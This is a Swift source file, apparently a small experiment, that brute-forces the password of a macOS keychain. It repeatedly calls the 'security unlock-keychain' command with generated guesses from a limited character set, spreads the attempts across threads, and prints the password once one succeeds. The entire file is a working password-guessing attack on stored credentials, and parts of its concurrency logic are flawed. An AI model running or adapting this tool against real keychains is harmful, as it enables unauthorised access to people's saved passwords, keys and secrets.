import Foundation
import Dispatch

func bruteKeychain(password: String) -> Bool {
    let process = Process()
    process.executableURL = URL(fileURLWithPath: "/usr/bin/security")
    process.arguments = ["unlock-keychain", "-p", password, "/users/INSERT-USER-HERE/Library/Keychains/test.keychain-db"]

    let pipe = Pipe()
    process.standardError = pipe

    do {
        try process.run()
        process.waitUntilExit()

        let stderrData = pipe.fileHandleForReading.readDataToEndOfFile()
        return stderrData.isEmpty
    } catch {
        print("Error: \(error)")
        return false
    }
}

func brute(length: Int, startTime: TimeInterval) {
    // Create an array of all possible characters
    let characters = "abcdefghijklm90!@".map { String($0) }

    // Create a dispatch queue for the search
    let queue = DispatchQueue.global()

    func search(prefix: String, depth: Int) {
        // If we have reached the maximum password length, try all possible passwords
        if depth == 0 {
            for character in characters {
                // Perform the search on a separate thread
                queue.async {
                    let result = bruteKeychain(password: prefix + character)
                    if result {
                        print("Password is: \(prefix + character)")
                        print("Time taken: \(Date().timeIntervalSince1970 - startTime)")
                        exit(0)
                    }
                }
            }
        } else {
            // If we have not reached the maximum password length, try all possible combinations of characters
            for character in characters {
                search(prefix: prefix + character, depth: depth - 1)
            }
        }
    }

    search(prefix: "", depth: length)

    // Wait for all search threads to complete
    queue.sync {}
}

let startTime = Date().timeIntervalSince1970

for len in 0..<7 {
    brute(length: len, startTime: startTime)
    print(len)
}
